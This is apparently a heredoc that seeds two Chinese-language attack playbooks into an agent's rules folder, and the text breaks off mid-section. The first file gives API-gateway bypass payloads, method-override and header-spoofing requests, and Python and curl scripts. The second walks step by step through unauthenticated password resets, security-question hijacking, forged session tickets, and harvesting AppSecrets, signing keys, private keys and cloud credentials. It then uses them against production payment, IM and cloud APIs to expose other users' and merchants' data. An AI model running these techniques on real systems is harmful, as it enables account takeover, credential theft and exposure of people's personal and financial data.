seed_rule techniques/api-gateway-test.md <<'TECH_API_GATEWAY_TEST_EOF'
# API 网关安全测试手册

## 一、路径规范化绕过

### 1.1 原理

```
API 网关和后端服务对路径的规范化处理不一致

网关: /api/admin → 拒绝访问
后端: /api/./admin → 规范化为 /api/admin → 允许访问

结果: 绕过网关的访问控制
```

### 1.2 常见 Payload

```bash
# 点号绕过
/api/./admin
/api/admin/.
/api/./admin/.

# 双斜杠
/api//admin
/api///admin

# URL 编码
/api/%2e/admin
/api/%2e%2e/admin
/api/%2f/admin

# 分号绕过（Spring Boot）
/api/;/admin
/api/admin;/

# 反斜杠（Windows）
/api\admin
/api\\admin

# 混合
/api/.;/admin
/api/;./admin
/api/%2e;/admin
```

### 1.3 测试脚本

```python
import requests

def test_path_normalization(base_url, protected_path):
    """测试路径规范化绕过"""
    
    payloads = [
        f"{protected_path}",
        f"./{protected_path}",
        f"{protected_path}/.",
        f"/{protected_path}",
        f"//{protected_path}",
        f"/{protected_path.replace('/', '%2f')}",
        f"/{protected_path.replace('/', '%2e/')}",
        f";/{protected_path}",
        f"{protected_path};/",
        f"/.;/{protected_path}",
    ]
    
    for payload in payloads:
        url = f"{base_url}{payload}"
        r = requests.get(url)
        
        print(f"[{r.status_code}] {payload}")
        
        if r.status_code == 200:
            print(f"    [!] 可能绕过成功")
            print(f"    响应长度: {len(r.text)}")

# 使用示例
test_path_normalization("https://target.com", "/api/admin")
```

---

## 二、HTTP 方法覆盖

### 2.1 原理

```
某些 API 网关支持通过请求头覆盖 HTTP 方法

GET /api/user/123 → 只读，允许
DELETE /api/user/123 → 删除，拒绝

GET /api/user/123
X-HTTP-Method-Override: DELETE
→ 网关看到 GET，放行
→ 后端看到 DELETE，执行删除
```

### 2.2 常见请求头

```bash
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
X-HTTP-Method: DELETE
X-Method: DELETE
_method: DELETE
```

### 2.3 测试脚本

```bash
# 测试方法覆盖
curl -X GET "https://target.com/api/user/123" \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Authorization: Bearer TOKEN"

curl -X POST "https://target.com/api/user/123" \
  -H "X-Method-Override: PUT" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

---

## 三、API 版本回退

### 3.1 原理

```
旧版本 API 可能缺少安全检查

/v2/api/user → 有权限检查
/v1/api/user → 无权限检查（已废弃但未下线）
```

### 3.2 测试方法

```bash
# 枚举 API 版本
curl "https://target.com/v1/api/user"
curl "https://target.com/v2/api/user"
curl "https://target.com/v3/api/user"
curl "https://target.com/api/v1/user"
curl "https://target.com/api/v2/user"

# 测试旧版本是否有漏洞
# 1. 权限检查缺失
# 2. 输入验证不足
# 3. 已知漏洞未修复
```

### 3.3 自动化脚本

```python
def test_api_versions(base_url, endpoint):
    """测试 API 版本回退"""
    
    versions = ["v1", "v2", "v3", "v4", "v5"]
    patterns = [
        f"/{{}}/{endpoint}",
        f"/{endpoint}/{{}}",
        f"/api/{{}}/{endpoint}",
        f"/api/{endpoint}/{{}}",
    ]
    
    for version in versions:
        for pattern in patterns:
            path = pattern.format(version)
            url = f"{base_url}{path}"
            
            r = requests.get(url)
            
            if r.status_code != 404:
                print(f"[{r.status_code}] {path}")
                
                # 测试是否有权限检查
                r_unauth = requests.get(url)  # 不带 token
                if r_unauth.status_code == 200:
                    print(f"    [!] 无权限检查")
```

---

## 四、速率限制绕过

### 4.1 X-Forwarded-For 轮换

```python
import requests
import random

def bypass_rate_limit_xff(url, count=100):
    """通过轮换 X-Forwarded-For 绕过速率限制"""
    
    for i in range(count):
        # 生成随机 IP
        fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        headers = {
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "X-Originating-IP": fake_ip,
        }
        
        r = requests.get(url, headers=headers)
        print(f"[{i+1}] {fake_ip} → {r.status_code}")
        
        if r.status_code == 429:
            print("    速率限制仍然生效")
            break
```

### 4.2 API Key 轮换

```python
def bypass_rate_limit_keys(url, api_keys):
    """通过轮换 API Key 绕过速率限制"""
    
    for i, key in enumerate(api_keys):
        r = requests.get(url, headers={"X-API-Key": key})
        print(f"[{i+1}] Key {key[:10]}... → {r.status_code}")
```

### 4.3 端点变体

```bash
# 相同功能的不同端点可能有独立的速率限制

# 端点 1
curl "https://target.com/api/search?q=test"

# 端点 2（相同功能）
curl "https://target.com/api/v2/search?q=test"
curl "https://target.com/search?q=test"
curl "https://target.com/api/query?keyword=test"
```

---

## 五、API 文档泄露

### 5.1 常见路径

```bash
# Swagger / OpenAPI
/swagger.json
/swagger.yaml
/openapi.json
/openapi.yaml
/api-docs
/api-docs.json
/v2/api-docs
/v3/api-docs
/swagger-ui.html
/swagger-ui/
/api/swagger.json
/api/swagger-ui.html

# GraphQL
/graphql
/graphiql
/graphql/schema
/graphql/console

# RAML
/api.raml
/raml/api.raml

# API Blueprint
/api.apib
/apiary.apib

# WADL
/application.wadl
/api/application.wadl
```

### 5.2 自动化扫描

```bash
# ffuf 批量检测
ffuf -u "https://target.com/FUZZ" \
  -w api-docs-paths.txt \
  -mc 200,301,302 \
  -o api-docs-results.json

# 从 JS 文件中提取 API 文档 URL
grep -rE "(swagger|openapi|api-docs)" *.js
```

### 5.3 利用 API 文档

```python
import requests
import json

def exploit_swagger(swagger_url):
    """从 Swagger 文档中提取所有端点"""
    
    r = requests.get(swagger_url)
    swagger = r.json()
    
    base_path = swagger.get('basePath', '')
    paths = swagger.get('paths', {})
    
    endpoints = []
    
    for path, methods in paths.items():
        for method, details in methods.items():
            endpoint = {
                'path': base_path + path,
                'method': method.upper(),
                'summary': details.get('summary', ''),
                'parameters': details.get('parameters', []),
            }
            endpoints.append(endpoint)
    
    return endpoints

# 使用示例
endpoints = exploit_swagger("https://target.com/swagger.json")

for ep in endpoints:
    print(f"{ep['method']} {ep['path']}")
    print(f"  {ep['summary']}")
    
    # 测试每个端点
    # ...
```

---

## 六、批量操作滥用

### 6.1 原理

```
批量 API 可能绕过单条记录的限制

单条: POST /api/user → 速率限制 10次/分钟
批量: POST /api/users/batch → 速率限制 10次/分钟，但每次可处理100条

结果: 实际可处理 1000条/分钟
```

### 6.2 测试方法

```bash
# 查找批量端点
/api/users/batch
/api/users/bulk
/api/users/import
/api/batch
/api/bulk

# 测试批量操作
curl -X POST "https://target.com/api/users/batch" \
  -H "Content-Type: application/json" \
  -d '{
    "users": [
      {"id": 1, "action": "delete"},
      {"id": 2, "action": "delete"},
      ...
      {"id": 1000, "action": "delete"}
    ]
  }'
```

---

## 七、参数污染（HPP）

### 7.1 原理

```
网关和后端对重复参数的处理不一致

请求: /api/user?id=1&id=2

网关: 取第一个 id=1 → 检查权限（自己的 ID）→ 放行
后端: 取最后一个 id=2 → 返回他人数据

结果: 越权访问
```

### 7.2 测试方法

```bash
# 重复参数
curl "https://target.com/api/user?id=MY_ID&id=VICTIM_ID"

# 数组参数
curl "https://target.com/api/user?id[]=MY_ID&id[]=VICTIM_ID"

# JSON 参数污染
curl -X POST "https://target.com/api/user" \
  -H "Content-Type: application/json" \
  -d '{"id": "MY_ID", "id": "VICTIM_ID"}'
```

---

## 八、Kong 特定绕过

### 8.1 路径规范化

```bash
# Kong 对路径的处理
/api/admin → 拒绝
/api/%61dmin → 绕过（URL 解码）
/api/admin%2f → 绕过（尾部斜杠）
```

### 8.2 插件绕过

```bash
# Kong 插件可能有配置错误

# 测试 JWT 插件
curl "https://target.com/api/protected" \
  -H "Authorization: Bearer invalid_token"

# 测试 ACL 插件
curl "https://target.com/api/admin" \
  -H "X-Consumer-Groups: admin"
```

---

## 九、Nginx 特定绕过

### 9.1 merge_slashes

```bash
# Nginx merge_slashes off 时
/api//admin → 不合并斜杠
/api///admin → 可能绕过规则
```

### 9.2 proxy_pass 配置错误

```nginx
# 错误配置
location /api/ {
    proxy_pass http://backend/;
}

# 请求: /api/../admin
# 转发: http://backend/../admin → http://backend/admin
```

---

## 十、AWS API Gateway 特定绕过

### 10.1 资源策略绕过

```bash
# 测试 IP 白名单
curl "https://api-id.execute-api.region.amazonaws.com/prod/endpoint" \
  -H "X-Forwarded-For: 允许的IP"
```

### 10.2 Lambda 授权器绕过

```bash
# 测试授权器逻辑
curl "https://api-id.execute-api.region.amazonaws.com/prod/endpoint" \
  -H "Authorization: Bearer malformed_token"

# 观察错误信息，可能泄露授权逻辑
```

---

## 十一、测试工具

### Arjun（参数发现）

```bash
# 安装
pip3 install arjun

# 发现隐藏参数
arjun -u https://target.com/api/user

# 可能发现: debug=1, internal=1, admin=true
```

### Kiterunner（API 端点发现）

```bash
# 安装
go install github.com/assetnote/kiterunner@latest

# 扫描 API 端点
kr scan https://target.com -w routes.txt

# 使用 Assetnote 词表
kr scan https://target.com -A=apiroutes-210228
```
TECH_API_GATEWAY_TEST_EOF

seed_rule techniques/authbypass-test.md <<'TECH_AUTHBYPASS_TEST_EOF'
# authbypass-authentication-flaws

打开是登录页 / SSO → 表单壳听 `rules/srcskill/dig-scope-workflow.md` §4.1.1：找业务面；别按本文件从头跑字典 / 验证码 / 无限试密。  
发会话、重置、改绑、换票、2FA 按本文件 + `rules/srcskill/dig-scope-workflow.md` §4.2.2 探针打，不要因为 §4.1.1 整摊跳过。表是每站下限，不是只准打这几枪。  
中间件裸默认口可一眼。滑块 / 发码 / 没进号的试密 → 转认证链，别停半截。写不写只认 `vuln-report-format.md`。
英文字典/验证码 20 法/重置矩阵已砍；短表指针用标题搜。Host 毒重置见 `http-host-header-test.md`。扫码登录 CSRF 见 `csrf-test.md` §18。

# Authentication Bypass

### 未登录改密口

认：改密/首次设密/重置最后一步，未登录也能打到。body 常见旧密或验码字段（`old_pwd` / `sms_code` 一类）+ 新密 + 身份 id。官方页写着要短信/旧密，接口仍可能吃空串。

打：不登录。旧密/验码置空或省略，新密过复杂度。对照：填错验码应拦；不存在的身份 id 应查空。同一密再打若报「与历史密码重复」=已经写进库，不是空成功。过了立刻改回；改不回就停，不要再换别人、不要登进去。

出：未登录 Success，改掉别人的密。

假点：只回 0 没写库；必须真旧密/真短信；Success 但登录走另一套 IdP、密没跟过去。

### IDaaS 未占用密保题

认：IDaaS 忘记密码。匿名提交用户名就签发 JWT，且 `scope` 是 `_`（不是 reset）。密保题库 id 可枚举，已绑在该号上的 id 写会 409。常见 IDaaS 皮 的 path 是 `forget_password/v2/sq`，同形态换皮照打。

打：

1. 不登录 POST sq，body `{"username":"admin"}`（或存在性口先确认的号）。
2. 带 token GET question，记下已绑 id。
3. POST `update_question` 写**未占用** id 的答案（已绑 id 不要硬写）。
4. `verifyquestions?type=RESET_PASSWORD` 带自写的三道题，换 `self.password.expired.reset`。
5. `set_password`：过了立刻改回；改不回停在回包，不要把管理员密改掉留下。策略拒且密保没写上 → 半条，不按打穿进表。

出：密保答案写到别人号上（改绑），或用该令牌真改掉别人的密。

假点：sq token 直接 set_password 报 `scope is not expected`；只能写已占用题 409；verify 错答；策略拒且密保没写上。单站没中不删短表这行。


### 未登录培训绑定口（短表有指针）

认：培训 / 学院 H5 网关把账号绑定、查询 RPC 放进未登录的 client 前缀（`/spapi/v2/client/` 一类）。body 吃 C 端 uid（`mtUserId`）+ 商家号（`bAccountId`），不要 Cookie。

打（不登录）：

1. POST bind：uid 换成别人、商家号换成自编  
2. POST querybind：只带 uid 或只带商家号  

算成：出对方手机，或绑定成功改绑。

假点：只回未登录/参数异常；uid 一律未绑手机且写不进。单站没中不删短表这行。密钥实值、某次手机号不进库。

### 联合登录只吃 uin（短表有指针）

认：云活动 / 黑客松 / 伙伴门户的签发口 body 只有 `provider` + 云账号 `uin`（或同类 uid），不验 OAuth `code` / `ticket` / `id_token`。公开列表或 by-code 能问出别人的 UIN。

打（不登录）：

1. 从公开伙伴/用户列表抄 `uin` 或先打 by-code  
2. `POST` 签发口，只带 `provider` + 对方 `uin`  
3. 拿 JWT 打 `me` / 用户信息  

算成：me 是**对方** UIN，能当这个号用。只出游客空号 → 没成。

假点：必须真 OAuth code；uin 未注册直接拒；票发了但 me 仍是自己。单站没中不删短表这行。密钥实值、某次 JWT 不进库。

### 活动实验室 login 不校验互联票（短表有指针）

认：活动页 login 吃互联 `openid`+`acctype`+`access_token`，服务端**不去互联校验**这张票。对照闸：同一套参数 `acctype=wx` 或 `access_token` 留空会登陆失败；`acctype=qq`/`qc`/`pt` 加假 token 仍发票。不是空密/omit 通用枪，也不是云活动只吃 uin 那条。前端 `fx_act_helper.js` / Milo 登录助手是常见皮，没有这名仍打。

打（不登录）：

1. POST `/api/login`（活动前缀跟页面，不要只认某一条 path），`access_token` 填假值、`acctype` 填 qq（qc/pt 再各一枪），`openid` 填可枚举号  
2. 拿 JWT 打 getRoles（按区服）/ bindRole 一类角色口。对照：不带头应要登录；wx/空票应失败  
3. 角色列表空别当没洞，换区服、换邻号；绑口跟到能绑上再停。过了能改回的改回  

算成：票里是对方 openid，角色列表出现他名下角色名/`charac_no`，或能绑上。

假点：只签发空号且角色列表全空、绑不上游戏角色；必须真互联票。密钥实值、某次 JWT 不进库。单站没中不删短表这行。

### 运营配置深链里的会话票（短表有指针）

认：未登录就能打的首页/运营配置 JSON，banner 跳转 URL（skipPath / jumpUrl / schema）query 里带着 `token` / `apptoken` / `access_token` 这类能当会话的串。对照闸：不带这串打 me 应登录过期。

打（不登录）：

1. 抄配置里整段跳转 URL，把 query 里的票放到 Token / Authorization 头  
2. 打 me / user info / 钱包  
3. 对照：同一口不带这串应过期  

算成：me 是别人的手机/角色，会话能当这个号用。

假点：票过期或占位串登不进去；配置只出运营文案没有票。密钥实值不进库。单站没中不删短表这行。

### 验签失败 302 回显算出的签（短表有指针）

认：支付/开放网关信封有 `sign_data`/`sign` + 商户号。假签时 **GET / DELETE / OPTIONS / HEAD 都可能 302**，Location 或 `msg` 里带服务端刚算的合法签（`calculateSign is:` 一类）。有的网关 GET 只 HTML/ILLEGAL_SIGN，换 METHOD 才漏；有的网关 **GET 自己就会 302 漏签**，不要只认 DELETE/OPTIONS。

打（不登录）：

1. 假签打签约/下单口，**GET 先看 Location** 有没有 `calculateSign`  
2. GET 没带签再换 DELETE/OPTIONS/HEAD，从 Location URL 解码抄签  
3. 填回 `sign_data` 打查询/订单。对照：假签仍失败，真签出他商户单  

算成：过签查出**他商户**未公开订单/账户正文（金额、关单原因、卡种）。

假点：所有 METHOD 都只报验签失败、没有算出的签；抄回去仍拒签。密钥实值不进库。单站没中不删短表这行。

### 身份供应商代调报错回显 token（短表有指针）

认：业务口帮前端调身份供应商。常见三皮：① 小程序码/跳转码口，`path`/`page`/`pagepath` 你能填，非法页时 message **原样带回** `access_token=`；② QQ/OAuth 换票口把 `client_secret` 拼进上游 URL，`redirect_uri` 改外域让下游 HTTP 5xx，报错 URL 把 `client_secret=` 吐给前端；③ 未登录业务口 `GET /api/business/access-token`（或同类领票 path）直接 200 出票，不必等报错回显。假码打本域回调往往只回业务错码、不带钥，**别停**。清单里有领票口，别只打签发码口。

打（不登录）：

1. 清单有领票口先 GET，200 且 `data` 是 `access_token` 就当已经抄到，不必再走非法 pagepath  
2. 没有领票口：path 填外站或明显非法页；换票口先假码+本域 `redirect_uri` 对照  
3. 换票口再把 `redirect_uri` 改外域，从报错 URL/message 抄 `access_token=` 或 `client_secret=`  
4. 身份票打 `身份供应商 API/cgi-bin/account/getaccountbasicinfo`，再 `/wxa/generatescheme`；QQ AppSecret 拿授权码换该应用 access_token / 打本站换票  

算成：能问出官方号主体/appid，或签发官方正式跳转码；或完整 AppSecret 能换成该应用 access_token。

假点：报错只有 ErrCode 没有 token/secret；假码本域回调不带钥；token 调身份接口无效；secret 换不了票。密钥实值不进库。单站没中不删短表这行。

### 开通页 RPC 下发 signKey（短表有指针）

认：支付 UISDK/开通页。未登录打配置或 thrift 口，body 只有可枚举 `appId`。死应用 `APP_NOT_FOUND` 且无钥，活应用回完整 `signKey`/`signMethod`。不是文档/webpack 写死（那枪见下一节）。

打（不登录）：

1. 换 `appId`。对照死号应无钥  
2. 抄活号 `signKey`，按回的 `signMethod`（常见 MD5，参按字典序拼 `&key=`）现签  
3. 打支付查询。对照假钥 `SIGN_ERROR`，真钥过签  
4. 过签别停在查询。打改结算卡 `change/card`：支行号差分出 `changeId`，原值报未变更才算写上。SUCCESS 但 `changeId=null` / 费率没变不算。过了立刻改回  

算成：完整 AppSecret 且真钥过生产验签；或查出他商户身份证/卡/挂单；或建出虚拟门店 poiId；或改掉他商户结算卡/开户行（`changeId` 有值）。

假点：回的是占位钥过不了验签；死活都 `APP_NOT_FOUND` 且无钥。密钥实值不进库。单站没中不删短表这行。

### 调试文档写死 AppSecret（短表有指针）

认：文档 / Demo / 官方包 / 接入 HTML / npm 历史包写死**完整** AppSecret（appId+appSecret、signKey、商户 pfx、SDK 钥），不是 `your-secret` / `YOUR_ACCESS_KEY` 占位。**wiki 把钥打成星号，同一套官方 zip / Demo / HTML 示例仍明文，别停。npm 旧版别当下架。** 常见皮：调试指南 `config.js`、FAQ 链到的 GitHub `properties`、文档操作截图 PNG、SDK zip 里 `prod/config.properties` / Demo Java `baseInfo`、接入 HTML 的 `MSDKConfig.json`、公网 npm `index.js`。旁边有换票口或按文档现签的生产口。算法在下面打哪，不钉某一家产品。

打（不登录）：

1. 从文档、FAQ 链过去的 GitHub、**或文档页操作截图**抄 appId/accessKey、appSecret/secretKey（实值只进报告，不进本库）。截图 OCR/看图即可，别停在 config.js
1b. 企业 IM/开放通讯录：换票后 `user/get` 或 `user/list` 的 mobile 是空串**别停**，打 `linkedcorp/user/get`（body `userid`）。对照通讯录口无手机、互联企业口出 11 位手机才算升链
2. 换票口：code 填假串。对照：secret 改成等长假值应「业务参数非法」；真密钥变成「授权码过期/无效 code」。本站没有 `/proxy`、换票口在另一棵业务域不打时，同产品独立 oauth `/oauth/v2/token` 直接 POST `grant_type=client_credentials`（对照假钥 `invalid_client`）
3. 分销/开放查询口：按文档 HMAC（key 小写字典序拼接，有 `test=test` 一类联调参就带上）。对照：假 secret 签名失败，真钥出该应用下的供给名单
4. 官方 CLI 改调试包/正式包口（`package/changeDebugVersion`、`changeVersion` 一类）。对照：假钥「密钥错误」，真钥过鉴权变成「游戏包资源不存在」也算钥活了，不要停在没上传真包。**改包口不要只打 upload/换版本**，WASM 分包 `packageBind` / `build` / `queryBuildResult` 也打；假钥密钥错误、真钥能绑到该应用名下算出写上
5. 网关写了服务器 IP 白名单：试 `X-Forwarded-For: 127.0.0.1`。无头应无权，加上后真钥出供给
6. 供给查询过签后别停在名单：打下单前校验（check），回真卖价/结算价再 booking。对照假钥签名失败。下出订单号立刻取消；改不回停在回包，禁止批量真下
7. GitHub/SDK 公开演示 RSA+3DES：生产 XML pay-gate 仍认时，现签 `POST /service/query` 解开返回密文。对照假钥验签失败。邻号共用同一把演示 RSA 时回业务错（订单号有误）不是验签失败，钥仍活。禁止真下单/退款
8. 开放文档对象存储超长预签名 SDK zip：解开 `prod/config.properties`（及国密配置）+ pfx，用配置密码开证书，抄商户号/signKey 打**生产查单**。对照假钥 SIGN_ERROR。只查单，禁止真转账
9. 游戏 MSDK：wiki encode=2 时 `sig=md5(msdkKey+timestamp)`（不绑 path/body、无时间窗）现签生产/测试 `/auth/*`。对照假签 `sig error`；真签过闸转到身份供应商 `access_token expired` / 手Q `0x711` 一类业务错也算钥活，别当没洞。V3 `/auth/guest_register`：`reqid` 明文 uuid 会 `decrypt faild`，用 msdkKey **前 16 个 ASCII** 做 QQ TEA（16 轮大端 `oi_symmetry_encrypt2`）再 hex；开出 guestid 再打 `/auth/guest_check_token`。没有玩家有效社交 token 就停，禁止为进号磨登录
10. 官方接入 HTML 示例 `MSDKConfig.json` 明文 `MSDK_SDK_KEY`：`source=0` 时 `sig=md5(path+"?"+除 sig 外字典序 query+body+钥)`；decrypt 用 `md5(ts+密文+钥)`（文档示例 ts/密文/签能对上再拿到生产打）。对照假签 `invalid sig`；真签过闸后打游客登录，`channel_info` 只放自编 uuid 仍签发 openid/token/jwt 就算用户票。禁止为进别人号磨渠道 code
11. npm 历史包写死 `developerId`+`signKey`：合作中心网关假签活号回「签名错误」、死号回「开发者数据异常」，可枚举活号。真签 `sign=SHA1(signKey+按 key 排序的 key+value)`。隐私号批量拉取口不带门店 `appAuthToken` 也能 `OP_SUCCESS`；换票口真签过闸转到「入驻状态不正确」也算钥活。空数组不是假点（当前没降级单）。**别停**：同套更高版本 npm 把 `appAuthToken` 写死别当联调丢掉，带令牌现签 `queryPoiInfo`，换 `ePoiId` 出他商户店名+11 位手机。禁止真下单/磨授权码
12. 充值/企业支付 Demo HTML（`enterprise_client` 一类）输入框写死 AppId+AppKey：别当联调占位。不登录抄出来，HMAC-SHA1 源串 `GET&urlencode(path)&urlencode(按 key 排序的 kv)`，密钥 `AppKey+'&'`，Base64 得 sig。对照假签 `sig error`。真签打生产 `/v1/r/{appid}/open_order` 出 `token_id`。只下未支付单，禁止走收银台付款/退款。实值只进报告
13. 登录页 JS 把钉钉 ISV `suiteKey`+`suiteSecret` 写成 `clientId`/`clientSecret`（值 `suited` 开头）：别当 OAuth 占位。不登录 POST `https://oapi.dingtalk.com/service/get_suite_token`，`suite_ticket` 填假值。对照假 secret 回「不合法的套件key或secret」。真钥出 `suite_access_token`。实值只进报告
14. 控制台 webpack/Vuex 默认地图 key 别当占位。假钥对照后不要只打逆地理：打地点云/图层 `table/list`，有表再 `data/list`。只逆地理通、表是空的 → 假点。实值只进报告
15. 官方文档/接入 HTML 示例 curl 写死 Gamekey：别当占位。不登录抄 AppID+Gamekey，`sign=md5(mod,func,appid,time,postdata,key)` 现签生产排队网关 `getZoneListCount`。对照假钥 `req sign error`。真签 `ret=0` 出区服在线。只查排队/在线，禁止往队列插人、禁止把人退出排队。实值只进报告

算成：钥是活的，能换成该应用的用户票，或业务查询出该应用下的供给名单，或给该应用绑上 WASM 分包版本，或 booking 下出该应用订单号，或解开**他商户**未公开支付订单持卡人；或假签验签失败、真签过生产闸转到下游身份供应商业务错（证明生产仍认这把完整钥）；或生产 `open_order` 出未支付 `token_id`；或钉钉 `get_suite_token` 出 `suite_access_token`；或生产排队 `getZoneListCount` `ret=0` 出区服在线。

假点：文档是占位符；真假密钥同一句错；钥过期调不通；联调钥只能打测试环境、生产拒；wiki 打码就当 zip/Demo 也打码。密钥实值不进库。单站没中不删短表这行。

### 门户 CMS 写死站点钥（短表有指针）

认：门户/开放平台前端（不是调试文档 zip）写死 门户 CMS 的 `accessKey`+`secretKey`。有 `GET /api/v1/cms/login`，回 JWT，头名常见 `cms-token`。首页可能只是 CMS 欢迎页，钥在另一个门户 JS 里。

打（不登录）：

1. 抄 AK/SK 打 login（实值只进报告）
2. 带票打 `channel/list`、`content/list|detail|search`、`attachment/list`
3. 不要停在官网轮播频道。跟开发者/测试/后台频道，GET `attachments.url`

算成：内部测试报告/未对公开展示频道的稿件正文（xlsx 表字段也算）。

假点：只有公开运营 Banner/客户端下载地址。密钥实值不进库。单站没中不删短表这行。

### 发签 nonce 是私钥（短表有指针）

认：企业 IM/业务 **unlogin** 发签口（`queryAppSignature` / `queryCorpSignature` 一类）。其它业务口请登录，这条不要 Cookie。回包 `nonceStr`/`nonce` 以 `MIIE` 或 `-----BEGIN` 开头，能当 PKCS8 私钥 load。常见前面还有未登录渠道/活码口漏 `corpId`。

打（不登录）：

1. 未登录渠道/活码漏 `corpId` 就抄  
2. POST 发签口带 url + corpId  
3. 把 `nonceStr` 当私钥 load（Python `load_der_private_key` / openssl）。对照：假 corpId 应业务错、没有 PEM  

算成：能 load 成 RSA 私钥。

假点：nonce 只是短随机串；假 corpId 一直业务错。密钥实值不进库。单站没中不删短表这行。

### 未登录发 IM/体验票（短表有指针）

认：未登录 `im/getConfig` 下发 TIM `userSig` 且 `identifier=null`；或云产品体验中心/apaas 发签口按请求里的**已有 userId** 发票（对照游客 `none_auth` 会新开号）；或同一后台其它业务口请登录，发签口只要自定义 trace 头 + 客户端传入的 userId 就发 IM/RTC userSig；或自建 IM 网关发签口只吃 appkey，票里没 userId，接入口 body 的 uId 才是身份；或 JS 写的 v2 inner 发签被 IP 白名单；或官方音视频/IM Web Demo 前端写死发签口和固定 pwd，identifier 跟请求走，空密也给已有用户发票。

打（不登录）：用该 sig 登 `IM 接入域`：`openim/login`、`getmsg`、`friend_get`、`get_joined_group_list`、群资料/消息。体验页再打 login_token 看 `data.phone`。对照闸：其它业务口应请登录；发签口只加 trace 头、userId 换成 interviewer_/candidate_ 一类；拿 authorization/signature 打群历史/进房。匿名 appkey 发票后，access/get 把 uId 换成 interviewer_/admin，看回包 userID。v2 `by_app_name` 回 IP not allowed **别停**，改打 v3 同 path，只要 `appName`。官方 Demo：抄 JS 里的 UserSigService URL 和 pwd，identifier 填已有用户编号；pwd 空串再打一枪。拿 userSig 打 friend_get，对照游客空号。

算成：拉到**他人**会话/群成员/好友，或明文手机。

假点：只能登游客 `null`、空会话、只有自己建的空群；换别人 UserID=70013；`none_auth` 只新开空号；演示号没绑手机不算。单站没中不删短表这行。

### 写死产品号发共享 JWT（短表有指针）

认：AIGC/小工具 H5 或落地页把产品号 / `qbid` 写死在脚本里。发签口（`account/qb` 一类）不登录就给**共享产品号** JWT，票里 name 是产品名不是游客。JS 往往只有 create / GET by id，没有 list。

打（不登录）：

1. 抄页面写死的产品号打发签口  
2. 带着票 POST 同源 `.../task/list`（或 workflow/history 一类 JS 没写的 list）。对照：不带票应未登录；空包 list 仍出 total  
3. 跟 `userImages` / 原图 CDN，确认真下到人脸/证件照  

算成：list total 海量且带**他人**原图/证件照。

假点：票只能建空任务；list total=0 或只有自己刚传的。密钥实值、某次 JWT 不进库。单站没中不删短表这行。

### 官方客服链签发外站（短表有指针）

认：企业客服 H5 签发链；内联有 `getXcxLink`/`get_wx_open_link`。不是通用跳转页。

打（不登录）：POST `queryStr=caUrl=外站&urlType=2`。打开返回的 `客服落地链`。

算成：落地页正式名是官方客服号，`base64Decode` 出的 query 是你填的网址。

假点：只签发本站 `/ca/`；落地页不带 query；必须登录。单站没中不删短表这行。

### 演示号领云钥（短表有指针）

认：云厂商产品 Demo / 体验页 / 控制台代理 / 供应商后台；领 STS、联合身份、建任务只要业务 id 或空 body，不要 Cookie。领 STS 口缺参只报字段校验不是登录闸，不一定有演示号。不是对象存储 STS 通配覆盖（那枪见 `file-upload-test.md`）。

打（不登录）：有演示号抄客户编号再打领钥 / 建任务 / 联合身份。没有演示号也打领钥口：缺参报字段校验别当登录闸。空 body 报缺 `AppId`/`Uin` 也别当没口，带能解析的数字 Uin 就可能发联邦 STS；bucket+file_name 仍打。领钥口可能在独立 demo CDN 的 `/openapi/`（页面 JS 跟过去）。分享域前端 HMAC 过网关后，对照其它口「token 不合法 / Token校验失败」，`/share/token/info` 一类领 STS 口不带分享页 token 仍打。换 bucket 用 PUT/NoSuchBucket 探活桶。钥拿去 GetCallerIdentity 对主账号；有启动、检索一类 Action 再签（余量不够别停，看能不能问出账号或出账单）。Epaas 过 HMAC `SC-SIGN` 后对照名单仍 UserNotLogin，专找 GetUploadURL/FileName 不校验 token（过签≠出数）。

算成：临时钥匙能问出 AccountId/角色名；同一身份下列表出现刚建的任务；或检索出口径出账单/实例/他主体业务字段；或活桶 PUT 200。

假点：钥匙调业务 API 全 Unauthorized；领钥口请登录/401；create 200 但列表没有。没有演示号/客户编号不是假点。单站没中不删短表这行。密钥实值不进库。

### 未登录签发合作方登录链（短表有指针）

认：电子合同 / 供应商门户人打开是登录页，框里只填可枚举合作方数字 id（partnerId / supplierId 一类），没有密码。未登录 `getUrl`（或同类签发登录链）直接回 `partnerId`+`generate`+`code`。旁边有 `setCookies` / 换票口吃这三项下会话。

打（不登录）：

1. 登录页 JS 抄签发口，合作方 id 用页上提示的数字或邻号  
2. 把回包三项 POST 给 setCookies / 换票口，抄 Set-Cookie  
3. 带会话打合同列表 / 支付进件 / 身份口。对照：不带 Cookie 应未登录；不存在的合作方 id 应查空  

算成：身份口登录成功，或能当这个号读未公开合同。

假点：签发口要已登录；code 必须从邮件点开；setCookies 不下会话；只出公开招商页。单站没中不删短表这行。密钥实值、某次 Cookie 不进库。

### 未登录合作方直连配置查询（短表有指针）

认：运营台 / 供应链前端把供应商直连配置查询挂成未登录。body 只有可枚举合作方数字 id（partnerId 一类），不要 Cookie。回包 `partnerInfos`（或同类）里带 clientId+clientSecret。

打（不登录）：

1. 运营台 JS 抄查询口（getV2 / tech/partner 一类）
2. partnerId 用邻号。对照：未配置的 id 应回查空/未配置，不是登录闸
3. 算出是完整 clientSecret，不是空成功码

算成：回包里是完整 clientId+clientSecret，能当这把直连钥用。

假点：接口已下线；clientSecret 空或占位；必须登录；只出公司名没有钥。单站没中不删短表这行。密钥实值不进库。

### 未登录签发回跳外域（短表有指针）

认：未登录签发 SSO / 回跳；callback 只判断字符串里有没有官方 host，或不校验、任意外域也能签。

打（不登录）：callback/redirect 填外域：夹官方 host（query/子域/userinfo）和**不夹**都试。回包有票/签再交给自家 SSO。通行证页看会不会 `location.replace(回跳+"?"+token名+"="+session)`。对照：不含官方字应被改空或拦。必须真机登录才出票且前端不会把 token 拼进回跳 → 半条，停在签单，不算打穿。

算成：SSO 成功且回跳仍是外域；或登完通行证出现在外域 query。

假点：callback 被改空；SSO 缺回调参数。单站没中不删短表这行。

### 缺参字段改头换票（短表有指针）

认：未登录业务口 JSON 报「缺少 xxx」；query/body 带了仍报缺少。或 Spring 400 HTML/`message` 写 `Required String parameter 'os' is not present` 一类，点名的是 **Cookie 名** 不是 query。

